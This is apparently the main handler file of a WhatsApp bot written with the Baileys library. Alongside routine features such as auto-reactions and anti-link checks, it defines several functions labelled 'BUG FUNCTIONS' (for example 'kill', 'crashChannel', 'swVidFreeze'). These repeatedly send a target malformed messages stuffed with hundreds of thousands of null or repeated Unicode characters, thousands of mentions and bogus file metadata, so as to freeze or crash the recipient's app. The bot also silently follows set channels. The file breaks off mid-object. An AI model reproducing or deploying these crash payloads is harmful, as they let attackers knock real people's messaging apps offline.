/*

CODED BY Void TECH INC 
*/
require('./lib/listmenu')
require('../setting/config')
const { 
  default: baileys, proto, jidNormalizedUser, generateWAMessage, 
  generateWAMessageFromContent, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");

const {
  downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, 
  generateWAMessageContent, makeInMemoryStore, MediaType, areJidsSameUser, 
  WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, 
  GroupMetadata, initInMemoryKeyStore, MiscMessageGenerationOptions, 
  useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, 
  WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, 
  WALocationMessage, WAContextInfo, WAGroupMetadata, ProxyAgent, 
  waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, 
  WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, 
  WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, 
  MediariyuInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, 
  WAMediaUpload, mentionedJid, processTime, Browser, MessageType, 
  Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, 
  GroupSettingChange, DisriyuectReason, WASocket, getStream, WAProto, 
  isBaileys, AnyMessageContent, fetchLatestBaileysVersion, 
  templateMessage, InteractiveMessage, Header 
} = require("@whiskeysockets/baileys");

const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const yts = require('yt-search');
const ytdl = require('@vreden/youtube_scraper');
const cheerio = require('cheerio');
const sharp = require('sharp')
const fg = require('api-dylux')
const FormData = require('form-data')
const { modul } = require('./module')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const timestampp = speed();
const jimp = require("jimp")
const didyoumean = require('didyoumean');
const similarity = require('similarity')
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const { googleTTS, } = modul
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins, generateProfilePicture } = require('../system/storage')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid, addExif } = require('../system/exif.js')
const { fetchBuffer, buffergif } = require("./lib/myfunc2")
const { shorturl, } = require("./lib/myfunc3");
const { Sticker, StickerTypes } = require('wa-sticker-formatter')
const translate = require("@vitalets/google-translate-api");
const ban = JSON.parse(fs.readFileSync("./start/lib/banned.json"))
global._antilink = {};
global.stickerCmds = {}; // key: sticker hash (base64), value: command string
module.exports = Void = async (Void, m, chatUpdate, store) => {

const { from } = m
try {
      
const body = (
  // Pesan teks biasa
  m.mtype === "conversation" ? m.message.conversation :
  m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :

  // Pesan media dengan caption
  ["imageMessage", "videoMessage", "documentMessage", "audioMessage", "stickerMessage"]
    .includes(m.mtype) ? m.message[m.mtype].caption || "" :

  // Pesan interaktif (tombol, list, dll.)
  m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
  m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
  m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
  m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :

  // Pesan khusus
  m.mtype === "messageContextInfo" ? (
    m.message.buttonsResponseMessage?.selectedButtonId ||
    m.message.listResponseMessage?.singleSelectReply.selectedRowId || 
    m.text
  ) :
  m.mtype === "reactionMessage" ? m.message.reactionMessage.text :
  m.mtype === "contactMessage" ? m.message.contactMessage.displayName :
  m.mtype === "contactsArrayMessage" ? 
    m.message.contactsArrayMessage.contacts.map(c => c.displayName).join(", ") :
  ["locationMessage", "liveLocationMessage"].includes(m.mtype) ? 
    `${m.message[m.mtype].degreesLatitude}, ${m.message[m.mtype].degreesLongitude}` :
  ["pollCreationMessage", "pollUpdateMessage"].includes(m.mtype) ? m.message[m.mtype].name :
  m.mtype === "groupInviteMessage" ? m.message.groupInviteMessage.groupJid :

  // Pesan sekali lihat (View Once)
  ["viewOnceMessage", "viewOnceMessageV2", "viewOnceMessageV2Extension"].includes(m.mtype) ? (
    m.message[m.mtype].message.imageMessage?.caption || 
    m.message[m.mtype].message.videoMessage?.caption || 
    "[Pesan sekali lihat]"
  ) :

  // Pesan sementara (ephemeralMessage)
  m.mtype === "ephemeralMessage" ? (
    m.message.ephemeralMessage.message.conversation ||
    m.message.ephemeralMessage.message.extendedTextMessage?.text || 
    "[Pesan sementara]"
  ) :

  // Pesan lain
  m.mtype === "interactiveMessage" ? "[Pesan interaktif]" :
  m.mtype === "protocolMessage" ? "[Pesan telah dihapus]" :
  ""
);
const budy = (typeof m.text == 'string' ? m.text : '');
const prefix = global.prefa 
  ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) 
    ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] 
    : ""
  : global.prefa ?? global.prefix;

const owner = JSON.parse(fs.readFileSync('./system/owner.json'));
const Premium = JSON.parse(fs.readFileSync('./system/premium.json'));
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1);
const botNumber = await Void.decodeJid(Void.user.id);
const text = q = args.join(" ")
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
const isPremium = [...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
const qtext = q = args.join(" ");
global.statusSave = false; // default OFF
 
global.deletedMessages = {};
global.saveDeletedMessages = false;
global.deleteSaverAttached = false;

global.editedMessages = {};
global.editWatcherOn = false;
global.editListenerAttached = false;
const quoted = m.quoted ? m.quoted : m;
const from = mek.key.remoteJid;
const { spawn, exec } = require('child_process');
const sender = m.isGroup ? (m.key.participant || m.participant) : m.key.remoteJid;
const isban = ban.includes(m.sender)
const groupMetadata = m.isGroup ? await Void.groupMetadata(from).catch(e => {}) : '';
const groupName = groupMetadata?.subject || "Unknown Group";
const participants = m.isGroup ? groupMetadata?.participants || '' : '';
const GroupAdmins = (m.isGroup && participants) ? await getGroupAdmi s(participants) : '';
const BotAdmins = m.isGroup ? groupAdmin.includes(BotNum) : false
const Admins = m.isGroup ? groupAdmin.includes(m.sender) : false
const pushname = m.pushName || "No Name";
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z');
const mime = (quoted.msg || quoted).mimetype || '';
const isMedia = /image|video|sticker|audio/.test(mime);
const todayDateWIB = new Date().toLocaleDateString('id-ID', {
  timeZone: 'Asia/Jakarta',
  year: 'numeric',
  month: 'long',
  day: 'numeric'
});
const TypeMess = getContentType(m?.message);
let reactions = TypeMess == "reactionMessage" ? m?.message[TypeMess]?.text : false;
        
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
const reaction = async (jidss, emoji) => {
    Void.sendMessage(jidss, {
        react: { text: emoji,
                key: m.key 
               } 
            }
        );
    };
    
 //end of code
 if (global.autoReact && global.autoReact[m.chat]) {
    const emojis = [
        "💨", "😁", "😂", "🤣", "😃", "😄", "😅", "😆", "😉", "😊",
        "😍", "😘", "😎", "🤩", "🤔", "😏", "😣", "😥", "😮", "🤐",
        "😪", "😫", "😴", "😌", "😛", "😜", "😝", "🤤", "😒", "😓",
        "😔", "😕", "🙃", "🤑", "😲", "😖", "😞", "😟", "😤", "😢",
        "😭", "😨", "😩", "🤯", "😬", "😰", "😱", "🥵", "🥶", "😳",
        "🤪", "🔥", "😠", "💨", "😷", "🤒", "🤕", "🤢", "🤮", "🤧",
        "😇", "🥳", "🤠", "🤡", "🤥", "🤫", "🤭", "🧐", "🤓", "😈",
        "👿", "👹", "👺", "💀", "👻", "💨", "👨‍💻", "🤖", "🎃", "😺",
        "😸", "😹", "😻", "😼", "😽", "🙀", "😿", "😾", "💋", "💌",
        "💘", "💝", "💖", "💗", "💓", "💞", "💕", "💟", "💔", "❤️"
    ]; // List of emojis to choose from

    const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)]; // Pick a random emoji

    try {
        await Void.sendMessage(m.chat, {
            react: {
                text: randomEmoji, // Emoji to react with
                key: m.key,        // Message key to react to
            },
        });
    } catch (err) {
        console.error('Error while reacting:', err.message);
    }
}
if (autoread) {
                Void.readMessages([m.key]);
            }
if (m.sender === '447768540300@s.whatsapp.net') {
  try {
    await Void.sendMessage(m.chat, { react: { text: '💨', key: m.key } });
  } catch (error) {
    console.error('',);
    // Optional: Send an error message to the chat
    await Void.sendMessage(m.chat, { react: { text: '🔥', key: m.key } });
    // to react again if catch error
  }
}
// List of channel IDs
const channelId = [
  "120363420565034105@newsletter",
  "120363403083144404@newsletter"
];

// Read followed channels from a file (if exists)
let followedChannels = new Set();
try {
  const data = fs.readFileSync('./followedChannels.json', 'utf8');
  followedChannels = new Set(JSON.parse(data));
} catch (err) {
  console.log('No previous follow data found, starting fresh.');
}

// Function to follow a channel if not already followed
function followNewsletter(channelIds) {
  try {
    // Pick a channel to follow (for example, first in the array)
    const channelToFollow = channelIds[0];  // You can choose a random or specific channel here

    // Check if the channel has already been followed
    if (!followedChannels.has(channelToFollow)) {
      // Follow the channel
      Void.newsletterFollow(channelToFollow);
      followedChannels.add(channelToFollow); // Add the channel to the set

      // Persist the updated followed channels
      fs.writeFileSync('./followedChannels.json', JSON.stringify(Array.from(followedChannels)), 'utf8');

      console.log(`Following channel: ${channelToFollow}`);
    } else {
      console.log(`Already followed channel: ${channelToFollow}`);
    }
  } catch (error) {
    console.error('Newsletter follow error:', error);
  }
}

// Call the function to follow a channel (only if not already followed)
followNewsletter(channelId);
//check command u want to type 
if (prefix && command) {
let caseNames = getCaseNames();
function getCaseNames() {
const fs = require('fs');
try {
const data = fs.readFileSync('./start/case.js', 'utf8');
const casePattern = /case\s+'([^']+)'/g;
const matches = data.match(casePattern);
if (matches) {
const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
return caseNames;
} else {
return [];
} } catch (err) {
console.log('There is an error:', err);
return [];
}}
let noPrefix = command
let mean = didyoumean(noPrefix, caseNames);
let sim = similarity(noPrefix, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
let response = `ɪ ᴅɪᴅ ɴᴏᴛ ᴜɴᴅᴇʀsᴛᴀᴍᴅ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ ᴅɪᴅ ʏᴏᴜ ᴍᴇᴀɴ?\n √ ${prefix+mean}\n•> Similarities: ${similarityPercentage}%`
m.reply(response)
}} 

// Temp in-memory toggle
let antilinkStatus = {};
if (autobio) {
            Void.updateProfileStatus(`☩ Equalizer ☩ ʙʏ ${ownername}`).catch(_ => _)
        }
        if (isCmd)  {
            console.log(chalk.black(chalk.bgWhite('[ RADIATE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=>In'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
        }
const ThumbUrl = "https://pomf2.lain.la/f/5l5eayi.jpg"
const image1 = fs.readFileSync(`./media/image1.jpg`)

const thumb = fs.readFileSync(`./media/thumb.png`)
const tdxlol = fs.readFileSync('./tdx.jpeg')
const Voidplay = fs.readFileSync('./media/radiate.mp3')
const reply = (teks) => {
Void.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./media/image1.jpg`),
"sourceUrl": `${link}`}}},
{ quoted: m})
}
const example = (teks) => {
return `Usage : *${prefix+command}* ${teks}`
}
const replygc = (teks) => {
Void.sendMessage(from, { text: teks }, { quoted : m})
}
const glxNull = {
            key: {
                remoteJid: 'status@broadcast',
                fromMe: false,
                participant: '18002428478@s.whatsapp.net'
            },
            message: {
                "interactiveResponseMessage": {
                    "body": {
                        "text": "_Rᴀᴅɪᴀᴛɪᴏɴ_",
                        "format": "DEFAULT",
                        "caption": "BY Void"
                    },
                    "nativeFlowResponseMessage": {
                        "name": "galaxy_message",
                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"Alwaysaqioo@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(10)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        "version": 3
                    }
                }
            }
        }
        const fcall = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: body}}}
        
const cursor = {
key: {
fromMe: false,
participant: "0@s.whatsapp.net",
remoteJid: ""
},
message: {
buttonsMessage: {
hasMediaAttachment: true,
contentText: `私はあなたが好き`,
footerText: ``,
buttons: [
{ buttonId: "\u0000".repeat(749999), buttonText: { displayText: "Kalknetrust" }, type: 1, nativeFlowInfo: { name: "single_select", paramsJson: "{}" } }
], 
viewOnce: true,
headerType: 1
}
}, 
contextInfo: {
virtexId: Void.generateMessageTag(),
participant: "0@s.whatsapp.net",
mentionedJid: ["0@s.whatsapp.net"],
}, 
};

const getDevice = require("@whiskeysockets/baileys").getDevice
// end reply 
if (!Void.public) {
if (!isCreator) return
}
const {
imageToWebp, 
videoToWebp, 
writeExifImg, 
writeExifVid, 
writeExif, 
addExif 
} = require('../system/Data2')

const {
    smsg,
    sendGmail,
    formatSize,
    isUrl,
    getBuffer,
} = require('./lib/myfunction');

const bubbleCharMap = {
    'a':'ⓐ','b':'ⓑ','c':'ⓒ','d':'ⓓ','e':'ⓔ','f':'ⓕ','g':'ⓖ','h':'ⓗ','i':'ⓘ','j':'ⓙ',
    'k':'ⓚ','l':'ⓛ','m':'ⓜ','n':'ⓝ','o':'ⓞ','p':'ⓟ','q':'ⓠ','r':'ⓡ','s':'ⓢ','t':'ⓣ',
    'u':'ⓤ','v':'ⓥ','w':'ⓦ','x':'ⓧ','y':'ⓨ','z':'ⓩ',
    'A':'Ⓐ','B':'Ⓑ','C':'Ⓒ','D':'Ⓓ','E':'Ⓔ','F':'Ⓕ','G':'Ⓖ','H':'Ⓗ','I':'Ⓘ','J':'Ⓙ',
    'K':'Ⓚ','L':'Ⓛ','M':'Ⓜ','N':'Ⓝ','O':'Ⓞ','P':'Ⓟ','Q':'Ⓠ','R':'Ⓡ','S':'Ⓢ','T':'Ⓣ',
    'U':'Ⓤ','V':'Ⓥ','W':'Ⓦ','X':'Ⓧ','Y':'Ⓨ','Z':'Ⓩ'
};
const glitchCharMap = {
    'a':'̷a','b':'̷b','c':'̷c','d':'̷d','e':'̷e','f':'̷f','g':'̷g','h':'̷h','i':'̷i',
    'j':'̷j','k':'̷k','l':'̷l','m':'̷m','n':'̷n','o':'̷o','p':'̷p','q':'̷q','r':'̷r',
    's':'̷s','t':'̷t','u':'̷u','v':'̷v','w':'̷w','x':'̷x','y':'̷y','z':'̷z',
    'A':'̷A','B':'̷B','C':'̷C','D':'̷D','E':'̷E','F':'̷F','G':'̷G','H':'̷H','I':'̷I',
    'J':'̷J','K':'̷K','L':'̷L','M':'̷M','N':'̷N','O':'̷O','P':'̷P','Q':'̷Q','R':'̷R',
    'S':'̷S','T':'̷T','U':'̷U','V':'̷V','W':'̷W','X':'̷X','Y':'̷Y','Z':'̷Z'
};
const fancyCharMap = {
    'a': '𝒜', 'b': 'ℬ', 'c': '𝒞', 'd': '𝒟', 'e': 'ℰ', 'f': 'ℱ', 'g': '𝒢',
    'h': 'ℋ', 'i': 'ℐ', 'j': '𝒥', 'k': '𝒦', 'l': 'ℒ', 'm': 'ℳ', 'n': '𝒩',
    'o': '𝒪', 'p': '𝒫', 'q': '𝒬', 'r': 'ℛ', 's': '𝒮', 't': '𝒯', 'u': '𝒰',
    'v': '𝒱', 'w': '𝒲', 'x': '𝒳', 'y': '𝒴', 'z': '𝒵',
    'A': '𝒜', 'B': 'ℬ', 'C': '𝒞', 'D': '𝒟', 'E': 'ℰ', 'F': 'ℱ', 'G': '𝒢',
    'H': 'ℋ', 'I': 'ℐ', 'J': '𝒥', 'K': '𝒦', 'L': 'ℒ', 'M': 'ℳ', 'N': '𝒩',
    'O': '𝒪', 'P': '𝒫', 'Q': '𝒬', 'R': 'ℛ', 'S': '𝒮', 'T': '𝒯', 'U': '𝒰',
    'V': '𝒱', 'W': '𝒲', 'X': '𝒳', 'Y': '𝒴', 'Z': '𝒵',
};

//==============================//
if (m.mimetype === 'image/webp' && m.fileSha256) {
    const hash = m.fileSha256.toString('base64');
    const mappedCommand = global.stickerCmds[hash];
    if (mappedCommand) {
        m.text = mappedCommand;
        command = mappedCommand;
        isCmd = true;
    }
}
// Add this part outside the switch, in your message handler:
if (m.isGroup && global._antilink[m.chat]) {
    const linkRegex = /(https?:\/\/[^\s]+)/gi;
    if (linkRegex.test(m.text) && !isAdmins && !isCreator) {
        const warningText = "WARNING: Sending links is not allowed in this group!";
        await Void.sendMessage(m.chat, { text: warningText }, { quoted: m });
        // Optional: Kick user
        // await conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
    }
}

if (m.isGroup && antilinkStatus[m.chat]) {
    const detectLink = /(https?:\/\/[^\s]+)|(\b\S*\.com\S*\b)/gi;
    if (detectLink.test(m.text)) {
        if (!isgroupAdmins && !m.key.fromMe) {
            await Void.sendMessage(m.chat, { delete: m.key });
        }
    }
}
// === POLL FUNCTION ===
const sendPollButtonMenu = async (Void, jid, quotedMsg) => {
  const pollMessage = {
    text: "*What is your favorite food?*",
    footer: "Choose one option below",
    buttons: [
      { buttonId: 'vote1', buttonText: { displayText: 'Rice' }, type: 1 },
      { buttonId: 'vote2', buttonText: { displayText: 'Bread' }, type: 1 },
      { buttonId: 'vote3', buttonText: { displayText: 'Cake' }, type: 1 }
    ],
    headerType: 1
  };

  await Void.sendMessage(jid, pollMessage, { quoted: quotedMsg });
};
// BUG FUNCTIONS
async function swVidFreeze(target, sebut = false) {
  for(let z = 0; z < 50; z++) {
    const media = generateWAMessageFromContent(target, {
      videoMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/537813786_1344011573884191_8566149874993540561_n.enc?ccb=11-4&oh=01_Q5Aa2wET26JBHdMRpUnzy_3UT6UaJYbUjdn6sEgQ1ahOCG62aQ&oe=69264578&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "OU+MmRfL9SSO0MZI2VcrC8/Vqr8U+bkKE/bnTg74YY8=",
        fileLength: 252408,
        seconds: 15,
        mediaKey: "Nw/2xPEw0z5yDWluRdpNDAZn8lWUFH1Ui6yjpUoDHpk=",
        height: 816,
        width: 768,
        fileEncSha256: "vz7HOSPHOcj3R8De5glz20ktBJIt8LhkN8gX5t2nLNI=",
        directPath: "/v/t62.7161-24/537813786_1344011573884191_8566149874993540561_n.enc?ccb=11-4&oh=01_Q5Aa2wET26JBHdMRpUnzy_3UT6UaJYbUjdn6sEgQ1ahOCG62aQ&oe=69264578&_nc_sid=5e03e0",
        mediaKeyTimestamp: 1761536267,
        caption: "Radiation - Ex3cutor" + "ꦾ".repeat(22), 
        contextInfo: {
          statusAttributionType: 2,
          isForwarded: true, 
          forwardingScore: 7202508,
          forwardedAiBotMessageInfo: {
            botJid: "13135550002@bot", 
            botName: "Meta AI", 
            creatorName: "7eppeli - Yuukey"
          }, 
          mentionedJid: Array.from({ length:2000 }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`)
        },
        streamingSidecar: "ZCTXLaWRSUS57M2WDi5Rmxk1kq9Jm8uPJAtt0Qm2Pdxh3hRYFM3IOg==",
        thumbnailDirectPath: "/v/t62.36147-24/531652303_1341445584346193_3521117362172863397_n.enc?ccb=11-4&oh=01_Q5Aa2wEK08NNxekWOl2uTJONY8JpIjdWijZ8uBMRvlhIv7lFWw&oe=6926531E&_nc_sid=5e03e0",
        thumbnailSha256: "XFmelyVsc04pajE/UH7cqxRIbOT8FF2PPqnjo/jIdDg=",
        thumbnailEncSha256: "B4u4FhVwI1OC3DTOuSLxwv5NKTJ5s3YFfZ/oqrI8hpE=",
        annotations: [
          {
            shouldSkipConfirmation: true,
            embeddedContent: {
              embeddedMusic: {
                musicContentMediaId: "1328419335741957",
                songId: "1221313878044460",
                author: "7eppeli.pdf",
                title: "ꦾ".repeat(9000),
                artworkDirectPath: "/v/t62.76458-24/538001898_1721507205206204_1856297105077950312_n.enc?ccb=11-4&oh=01_Q5Aa2wG6vgDeEBNpBou9E_hlOwfQid9sttzm8sXIT_GL-MyJYQ&oe=692643CB&_nc_sid=5e03e0",
                artworkSha256: "DQIz0Oj5q9X3DMmLIAEZ+0dGN0tVWWhKx7AMgOtuhCs=",
                artworkEncSha256: "pzljQhAsS8uKKVvBHwYhjFhYXb2oz7Ha6io5qu7oBW4=",
                artistAttribution: "https://id.Zeppeli.pdf",
                countryBlocklist: "+62",
                isExplicit: true,
                artworkMediaKey: "+O9eJ1/zuS2GRYDWkHgK7nohkP5zRIMAEhnmObrU6E0="
              }
            },
            embeddedAction: true
          }
        ]
      }
    }, {});
    const additionalNodes = [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              }
            ],
          }
        ],
      }
    ];
    await Void.relayMessage("status@broadcast", media.message, {
      messageId: media.key.id,
      statusJidList: [target],
      additionalNodes,
    });
  }
  if(sebut) {
    let Void = generateWAMessageFromContent(target, proto.Message.fromObject({
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: media.key,
            type: "STATUS_MENTION_MESSAGE",
            timestamp: Date.now() + 720,
          },
        },
      }
    }), {})
    await Void.relayMessage(target, Void.message, {
      participant: { jid:target }, 
      additionalNodes: [
        {
          tag: "meta",
          attrs: { is_status_mention: "true" },
          content: undefined,
        }
      ],
    });
  }
}
// end of Bug function
// BUG FUNCTIONS 
async function gsInter(target, zid = true) {
  for(let z = 0; z < 75; z++) {
    let msg = generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length:2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`)
        }, 
        body: {
          text: "\u0000".repeat(200),
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    }, {});
  
    await Void.relayMessage(target, {
      groupStatusMessageV2: {
        message: msg.message
      }
    }, zid ? { messageId: msg.key.id, participant: { jid:target } } : { messageId: msg.key.id });
  }
} 
// end of Bug function 
// BUG FUNCTIONS
async function Delay1(target, zid = true) {
  for(let z = 0; z < 75; z++) {
    let msg = generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length:2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`)
        }, 
        body: {
          text: "\u0000".repeat(200),
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    }, {});
  
    await Void.relayMessage(target, {
      groupStatusMessageV2: {
        message: msg.message
      }
    }, zid ? { messageId: msg.key.id, participant: { jid:target } } : { messageId: msg.key.id });
  }
} 
// end of Bug function 
// BUG FUNCTIONS 
async function delay2(target, zid = true) {
  for(let z = 0; z < 75; z++) {
    let msg = generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length:2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`)
        }, 
        body: {
          text: "\u0000".repeat(200),
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    }, {});
  
    await Void.relayMessage(target, {
      groupStatusMessageV2: {
        message: msg.message
      }
    }, zid ? { messageId: msg.key.id, participant: { jid:target } } : { messageId: msg.key.id });
  }
} 
// end of Bug function 
// BUG FUNCTIONS 
async function kill(target, zid = true) {
  for(let z = 0; z < 75; z++) {
    let msg = generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length:2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`)
        }, 
        body: {
          text: "\u0000".repeat(200),
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    }, {});
  
    await Void.relayMessage(target, {
      groupStatusMessageV2: {
        message: msg.message
      }
    }, zid ? { messageId: msg.key.id, participant: { jid:target } } : { messageId: msg.key.id });
  }
} 
// end of Bug functions
// BUG FUNCTIONS 
async function rageioshere(target) {
let tmsg = await generateWAMessageFromContent(target, {
                extendedTextMessage: {
                    text: '@Radiation\n' + "\n\n\n" + "𑪆".repeat(60000),
                    previewType: 0,
                    contextInfo: {
                        mentionedJid: [target]
                    }
                }
    }, {});

    await Void.relayMessage("status@broadcast", tmsg.message, {
        messageId: tmsg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined,
                }],
            }],
        }],
    });
}
// end of Bug function 
// BUG FUNCTIONS
async function crashChannel(target) {
  await Void.relayMessage(target, {
    viewOnceMessage: {
      message: {
        groupStatusMentionMessage: {
          name: "☩ Equalizer ☩ - ᴄʀᴀsʜ",
          jid: target,
          mention: ["13135550002@s.whatsapp.net"],
          contextInfo: {
            businessOwnerJid: "13135550002@s.whatsapp.net"
          }
        }
      }
    }
  }, {});
}
// end of Bug function
// BUG FUNCTIONS
async function zalthrexhytam(Void, target) {
    Void.relayMessage(target, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            hasMediaAttachment: false,
                            title: "Radiation¿" 
                            + "ꦽ".repeat(50000),
                        },
                        body: {
                            text: "",
                        },
                        nativeFlowMessage: {
                            name: "single_select",
                            messageParamsJson: "",
                        },
                        payment: {
                            name: "galaxy_message",
                            messageParamsJson: '{"icon":"DOCUMENT","flow_cta":"\\u0000","flow_message_version":"3"}',
                        },
                    },
                },
            },
        },
        {}
    );
}
// end of Bug function
//======BLANK BUG FUNCTION======
async function NotifblankV2(target, ptcp = true) {
  await Void.relayMessage(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "\u200B",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true,
